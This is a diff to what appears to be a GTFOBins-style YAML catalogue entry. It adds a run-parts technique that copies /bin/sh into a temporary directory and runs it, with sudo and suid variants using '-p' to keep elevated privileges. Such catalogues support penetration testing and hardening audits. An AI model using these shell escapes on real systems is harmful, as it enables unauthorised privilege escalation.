@@ -10,4 +10,15 @@ functions:
           run-parts --new-session --regex '^sh$' /bin --arg='-p'
         shell: false
       unprivileged:
+  - code: |-
+      cp /bin/sh /path/to/temp-dir/
+      run-parts /path/to/temp-dir/
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          cp /bin/sh /path/to/temp-dir/
+          run-parts /path/to/temp-dir/ --arg='-p'
+        shell: false
+      unprivileged:
 ...
